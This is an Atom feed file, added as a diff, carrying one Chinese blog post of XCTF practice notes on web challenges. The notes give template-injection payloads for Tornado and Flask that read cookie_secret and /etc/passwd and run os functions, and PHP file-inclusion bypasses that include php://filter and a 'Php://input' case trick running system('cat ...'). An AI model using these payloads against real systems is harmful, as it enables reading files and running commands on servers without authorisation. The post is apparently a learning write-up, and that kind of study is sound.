@@ -1,0 +1,148 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://StarofEden.github.io</id>
+    <title>StarofEden🌸 • Posts by &#34;ctf&#34; tag</title>
+    <link href="https://StarofEden.github.io" />
+    <updated>2023-04-14T16:00:00.000Z</updated>
+    <category term="博客美化" />
+    <category term="火狐插件" />
+    <category term="web安全" />
+    <category term="ctf" />
+    <category term="blog 博客美化" />
+    <entry>
+        <id>https://starofeden.github.io/2023/04/15/xctf%E5%88%B7%E9%A2%98/</id>
+        <title>xctf刷题</title>
+        <link rel="alternate" href="https://starofeden.github.io/2023/04/15/xctf%E5%88%B7%E9%A2%98/"/>
+        <content type="html">&lt;h1 id=&#34;模板注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#模板注入&#34;&gt;#&lt;/a&gt; &lt;strong&gt;模板注入&lt;/strong&gt;&lt;/h1&gt;
+&lt;h2 id=&#34;tornado-框架&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tornado-框架&#34;&gt;#&lt;/a&gt; Tornado 框架&lt;/h2&gt;
+&lt;h3 id=&#34;知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点&#34;&gt;#&lt;/a&gt; 知识点：&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;render 函数：通过传递不同的参数形成不同的改变&lt;/li&gt;
+&lt;li&gt;tornado render 模板注入漏洞：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&amp;#123;&amp;#123;&amp;#125;&amp;#125;进行传递变量和执行简单的表达式。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;得到cookie_secret的值&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#得到cookie_secret的值&#34;&gt;#&lt;/a&gt; 得到 cookie_secret 的值：&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;error?msg=&amp;#123;&amp;#123;handler.settings&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;handler.settings 是 tornado 框架的一个附属文件&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id=&#34;flassk模板注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flassk模板注入&#34;&gt;#&lt;/a&gt; flassk 模板注入&lt;/h2&gt;
+&lt;h3 id=&#34;思路&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#思路&#34;&gt;#&lt;/a&gt; 思路：&lt;/h3&gt;
+&lt;p&gt;找到父类 &amp;lt;type ‘object’&amp;gt;–&amp;gt; 寻找子类–&amp;gt; 找关于命令执行或者文件操作的模块。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;几个魔术方法：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__class__  返回类型所属的对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__base__   返回该对象所继承的基类&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// __base__和__mro__都是用来寻找基类的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__init__  类的初始化方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__globals__  对包含函数全局变量的字典的引用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;## &amp;#123;&amp;#123;&amp;#125;&amp;#125;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 传递变量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 执行一些简单表达式&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;
+：查看全局变量
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#步骤&#34;&gt;#&lt;/a&gt; 步骤：&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;寻找可用引用&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#x27;&amp;#x27;.__class__.__mro__[2].__subclasses__()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;文件读取， &lt;code&gt;[40]&lt;/code&gt;  是 tupe file 类型出现位置（从 0 开始的位置）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123; [].__class__.__base__.__subclasses__()[40](&amp;#x27;/etc/passwd&amp;#x27;).read() &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;命令执行 (有一个 &amp;lt;class ‘site._Printer’&amp;gt; 类型)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#x27;&amp;#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&amp;#x27;os&amp;#x27;].listdir(&amp;#x27;.&amp;#x27;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;[71]&lt;/code&gt;  为 &amp;lt;class ‘site._Printer’&amp;gt; 出现位置&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;2文件include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2文件include&#34;&gt;#&lt;/a&gt; 2. 文件 include&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;5.10 更新：好久没刷题了，做个 md 复习一下&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;file_include过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#file_include过滤&#34;&gt;#&lt;/a&gt; file_include (过滤)&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;./check.php&amp;quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;  = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;尝试用 php://filter:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?filename=php://filter/read=convert.base64-encode/reasource=check.php&lt;br&gt;
+ 回显 &amp;quot;do not hack!&amp;quot;&lt;br&gt;
+ 那应该是过滤&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;使用过滤器 convert.* (string.* 被过滤)&lt;/li&gt;
+&lt;li&gt;构造 URL：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?filename=php://filter/convert.iconv.a.b/resource=flag.php&lt;br&gt;
+ &lt;code&gt;flag可能在flag.php&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;使用 bp 对 a,b 进行爆破 (集束炸弹)，字典如下：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;UCS-4*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-4BE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-4LE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-2BE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-2LE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-32*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-32BE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-32LE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-16*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-16BE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-16LE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF7-IMAP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-8*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ASCII*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;web_php_include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web_php_include&#34;&gt;#&lt;/a&gt; web_php_include&lt;/h2&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;show_source&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;page&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;strstr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;php://&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;php://&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//过滤了php://&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;知识点-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点-2&#34;&gt;#&lt;/a&gt; 知识点&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;由题可知过滤了 php://, 考虑使用其它伪协议&lt;/li&gt;
+&lt;li&gt;伪协议包括：&lt;br&gt;
+&lt;strong&gt;file 协议&lt;/strong&gt;：&lt;br&gt;
+allow_url_fopen ：off/on&lt;br&gt;
+allow_url_include：off/on&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;file://  &lt;code&gt;用于访问本地文件系统&lt;/code&gt; ，在 CTF 中通常用来读取本地文件的且不受 allow_url_fopen 与 allow_url_include 的影响。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;php:// 协议&lt;/strong&gt;:&lt;br&gt;
+ 仅 php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;data:// 协议&lt;/strong&gt;：满足双 off 条件&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;strstr&lt;/strong&gt; 函数：&lt;br&gt;
+函数用于判断字符串 str2 是否是 str1 的子串。如果是，则该函数返回 str1 字符串从 str2 第一次出现的位置开始到 str1 结尾的字符串；否则，返回 NULL。&lt;/li&gt;
+&lt;li&gt;**str_replace ()** 函数：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;以其他字符替换字符串中的一些字符（区分大小写）。&lt;br&gt;
+例如：把字符串 “Hello world!” 中的字符 “world” 替换为 “Shanghai”：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;world&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;Shanghai&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello world!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;本题意思为当传给 page 的参数有 php：// 时替换为空&lt;/p&gt;
+&lt;h3 id=&#34;解题步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解题步骤&#34;&gt;#&lt;/a&gt; 解题步骤&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;使用 php：//input&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;构造 URL：?page=Php://input// 大写绕过&lt;br&gt;
+使用 bp 传入：&lt;br&gt;
+a=&lt;?php system(&#39;ls&#39;);?&gt;a&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;playload:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a = &amp;lt;?php system(&amp;#x27;cat fl4gisisish3r3.php&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;cat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cat&#34;&gt;#&lt;/a&gt; cat&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;并不是命令注入&lt;/li&gt;
+&lt;li&gt;看 wp 得知&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;未过滤字符在 url 栏上会被进行 url 编码&lt;br&gt;
+在 url 栏测试宽字符，即 ascii 码超过 127 的 url 编码即可，也就是 %81-% ef&lt;br&gt;
+ 发现任意一个宽字符，都会出现报错信息&lt;br&gt;
+&lt;em&gt;这道题有关一个 djiango 特性和 php 特性，没看懂。&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;解题步骤：&lt;br&gt;
+playload1：?url=%80, 发现报错，url 编码使用的是 16 进制，80 也就是 128，ASCII 码是从 0-127，所以这个时候会报错。&lt;br&gt;
+&lt;strong&gt;php 特性&lt;/strong&gt;：&lt;br&gt;
+WP 得知 php 的 curl 组件请求加上 @会读取文件，读取 settings.py 文件获取数据库名称&lt;/li&gt;
+&lt;li&gt;构造 playload2：&lt;br&gt;
+?url=@/opt/api/api/settings.py &lt;em&gt;读取配置文件&lt;/em&gt;&lt;br&gt;
+ Ctrl+f 搜索 database&lt;/li&gt;
+&lt;li&gt;构造 playload3：&lt;br&gt;
+?url=@/opt/api/database.sqlite3&lt;br&gt;
+ &lt;code&gt;搜索flag/ctf可得flag&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;最后的flag竟然不包含前面的A&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="ctf" />
+        <updated>2023-04-14T16:00:00.000Z</updated>
+    </entry>
+</feed>
